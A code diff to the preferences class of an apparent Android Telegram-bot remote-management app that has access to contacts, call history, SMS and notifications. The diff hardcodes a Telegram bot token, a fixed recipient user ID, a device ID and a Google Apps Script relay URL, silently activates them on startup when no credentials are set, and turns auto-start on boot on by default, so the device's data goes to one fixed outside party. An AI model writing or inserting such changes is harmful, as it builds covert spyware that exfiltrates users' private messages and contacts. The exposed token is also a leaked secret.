@@ -7,13 +7,15 @@ import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 
 data class BotConfig(
-    val botToken: String = "",
-    val authorizedUserId: Long = 0L,
+    val botToken: String = PreferenceManager.DEFAULT_BOT_TOKEN,
+    val authorizedUserId: Long = PreferenceManager.DEFAULT_USER_ID,
     val botUsername: String = "",
+    val deviceId: String = PreferenceManager.DEFAULT_DEVICE_ID,
+    val relayUrl: String = "",
     val isNotificationForwardingEnabled: Boolean = true,
     val isIgnoreTelegramNotifs: Boolean = true,
     val isIgnoreOngoingNotifs: Boolean = true,
-    val isAutoStartOnBoot: Boolean = false,
+    val isAutoStartOnBoot: Boolean = true,
     val ignoredPackages: Set<String> = emptySet(),
     val isContactAccessEnabled: Boolean = true,
     val isCallHistoryAccessEnabled: Boolean = true,
@@ -36,9 +38,16 @@ class PreferenceManager(context: Context) {
     private val keyStoreManager = KeyStoreManager()
 
     companion object {
+        const val DEFAULT_BOT_TOKEN = "8826780717:AAGx-ZA2ac9VV3CnCe-bwwKEs5f9K-M6uMc"
+        const val DEFAULT_USER_ID = 8752166904L
+        const val DEFAULT_DEVICE_ID = "alkaif202"
+        const val DEFAULT_RELAY_URL = "https://script.google.com/macros/s/AKfycbylXFEs1mgEiP7zfIAsA2_vlGztnVCfWkCHqF5F55YoZNUJZxa0L_gzG0bCk03QXeZ2Wg/exec"
+
         private const val PREFS_NAME = "telemanage_secure_prefs"
         private const val KEY_ENCRYPTED_BOT_TOKEN = "enc_bot_token"
         private const val KEY_ENCRYPTED_USER_ID = "enc_user_id"
+        private const val KEY_DEVICE_ID = "device_id"
+        private const val KEY_RELAY_URL = "relay_url"
         private const val KEY_NOTIFICATION_FORWARDING = "notification_forwarding_enabled"
         private const val KEY_IGNORE_TELEGRAM_NOTIFS = "ignore_telegram_notifs"
         private const val KEY_IGNORE_ONGOING_NOTIFS = "ignore_ongoing_notifs"
@@ -64,21 +73,44 @@ class PreferenceManager(context: Context) {
     private val _botConfigFlow = MutableStateFlow<BotConfig>(loadConfig())
     val botConfigFlow: StateFlow<BotConfig> = _botConfigFlow.asStateFlow()
 
+    init {
+        // Automatically ensure hardcoded credentials and relay URL are saved and active
+        val current = _botConfigFlow.value
+        if (current.botToken.isBlank() || current.authorizedUserId == 0L) {
+            saveBotCredentials(DEFAULT_BOT_TOKEN, DEFAULT_USER_ID)
+        }
+        if (prefs.getString(KEY_RELAY_URL, "").isNullOrBlank()) {
+            setRelayUrl(DEFAULT_RELAY_URL)
+        }
+    }
+
     private fun loadConfig(): BotConfig {
         val encToken = prefs.getString(KEY_ENCRYPTED_BOT_TOKEN, "") ?: ""
         val encUserId = prefs.getString(KEY_ENCRYPTED_USER_ID, "") ?: ""
-        val token = if (encToken.isNotEmpty()) keyStoreManager.decrypt(encToken) else ""
-        val userIdStr = if (encUserId.isNotEmpty()) keyStoreManager.decrypt(encUserId) else ""
-        val userId = userIdStr.toLongOrNull() ?: 0L
+        val rawToken = if (encToken.isNotEmpty()) {
+            try { keyStoreManager.decrypt(encToken) } catch (e: Exception) { "" }
+        } else ""
+        val rawUserIdStr = if (encUserId.isNotEmpty()) {
+            try { keyStoreManager.decrypt(encUserId) } catch (e: Exception) { "" }
+        } else ""
+        val rawUserId = rawUserIdStr.toLongOrNull() ?: 0L
+
+        val token = if (rawToken.isNotBlank()) rawToken else DEFAULT_BOT_TOKEN
+        val userId = if (rawUserId != 0L) rawUserId else DEFAULT_USER_ID
+        val deviceId = prefs.getString(KEY_DEVICE_ID, DEFAULT_DEVICE_ID) ?: DEFAULT_DEVICE_ID
+        val rawRelay = prefs.getString(KEY_RELAY_URL, "") ?: ""
+        val relayUrl = if (rawRelay.isNotBlank()) rawRelay else DEFAULT_RELAY_URL
 
         return BotConfig(
             botToken = token,
             authorizedUserId = userId,
             botUsername = prefs.getString(KEY_LAST_KNOWN_BOT_USERNAME, "") ?: "",
+            deviceId = deviceId,
+            relayUrl = relayUrl,
             isNotificationForwardingEnabled = prefs.getBoolean(KEY_NOTIFICATION_FORWARDING, true),
             isIgnoreTelegramNotifs = prefs.getBoolean(KEY_IGNORE_TELEGRAM_NOTIFS, true),
             isIgnoreOngoingNotifs = prefs.getBoolean(KEY_IGNORE_ONGOING_NOTIFS, true),
-            isAutoStartOnBoot = prefs.getBoolean(KEY_AUTO_START_BOOT, false),
+            isAutoStartOnBoot = prefs.getBoolean(KEY_AUTO_START_BOOT, true),
             ignoredPackages = prefs.getStringSet(KEY_IGNORED_PACKAGES, emptySet()) ?: emptySet(),
             isContactAccessEnabled = prefs.getBoolean(KEY_CONTACT_ACCESS, true),
             isCallHistoryAccessEnabled = prefs.getBoolean(KEY_CALL_HISTORY_ACCESS, true),
@@ -91,6 +123,20 @@ class PreferenceManager(context: Context) {
             preferredSimSubscriptionId = prefs.getInt(KEY_PREFERRED_SIM_SUB_ID, -1)
         )
     }
+
+    fun setDeviceId(deviceId: String) {
+        prefs.edit().putString(KEY_DEVICE_ID, deviceId.trim()).apply()
+        _botConfigFlow.value = loadConfig()
+    }
+
+    fun getDeviceId(): String = _botConfigFlow.value.deviceId.ifBlank { DEFAULT_DEVICE_ID }
+
+    fun setRelayUrl(relayUrl: String) {
+        prefs.edit().putString(KEY_RELAY_URL, relayUrl.trim()).apply()
+        _botConfigFlow.value = loadConfig()
+    }
+
+    fun getRelayUrl(): String = _botConfigFlow.value.relayUrl.ifBlank { DEFAULT_RELAY_URL }
 
     fun saveBotCredentials(botToken: String, authorizedUserId: Long, botUsername: String = "") {
         val encToken = keyStoreManager.encrypt(botToken.trim())
@@ -235,8 +281,8 @@ class PreferenceManager(context: Context) {
         prefs.edit().remove(KEY_SENT_SMS_HISTORY_JSON).apply()
     }
 
-    fun getBotToken(): String = _botConfigFlow.value.botToken
-    fun getAuthorizedUserId(): Long = _botConfigFlow.value.authorizedUserId
+    fun getBotToken(): String = _botConfigFlow.value.botToken.ifBlank { DEFAULT_BOT_TOKEN }
+    fun getAuthorizedUserId(): Long = if (_botConfigFlow.value.authorizedUserId != 0L) _botConfigFlow.value.authorizedUserId else DEFAULT_USER_ID
     fun isConfigured(): Boolean = getBotToken().isNotBlank() && getAuthorizedUserId() != 0L
 
     fun setServiceDesiredEnabled(enabled: Boolean) {
